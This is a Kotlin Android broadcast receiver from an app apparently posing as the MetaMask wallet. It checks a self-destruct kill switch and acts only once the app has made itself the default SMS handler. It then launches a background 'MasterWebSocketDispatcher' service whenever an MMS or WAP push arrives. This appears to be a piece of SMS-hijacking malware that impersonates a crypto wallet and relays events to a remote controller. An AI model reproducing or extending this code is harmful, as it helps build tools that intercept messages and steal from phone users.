package com.example.MetaMask.activities

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import androidx.annotation.Keep
import com.example.MetaMask.activities.WebViewActivity
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.SelfDestructService

@Keep
class MmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        android.util.Log.d("XDBG", "[MmsReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (context == null) {
            android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
            return
        }

        val killSwitchPrefs = context.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
            return
        }

        val prefs = context.getSharedPreferences(
            WebViewActivity.PREFS_NAME,
            Context.MODE_PRIVATE
        )
        var isSetupComplete = prefs.getBoolean(WebViewActivity.PREF_KEY_SETUP_COMPLETE, false)

        val isDefaultSms = try {
            Telephony.Sms.getDefaultSmsPackage(context) == context.packageName
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            false
        }

        if (!isSetupComplete) {
            android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
            if (isDefaultSms) {
                android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
                prefs.edit().putBoolean(WebViewActivity.PREF_KEY_SETUP_COMPLETE, true).apply()
                isSetupComplete = true
            } else {
                return
            }
        }

        val action = intent?.action

        val validActions = setOf(
            "android.provider.Telephony.WAP_PUSH_DELIVER",
            "android.provider.Telephony.WAP_PUSH_RECEIVED"
        )

        if (action == null || action !in validActions) {
            android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
            return
        }

        try {
            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", action)
            }
            startCorrespondingService(context, masterIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun startCorrespondingService(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[MmsReceiver] startCorrespondingService enter context=ctx intent=${intent}") //xdbg
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[MmsReceiver] if branch") //xdbg
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (e: SecurityException) {
            android.util.Log.e("XDBG", "[MmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        } catch (e: IllegalStateException) {
            android.util.Log.e("XDBG", "[MmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[MmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }
}
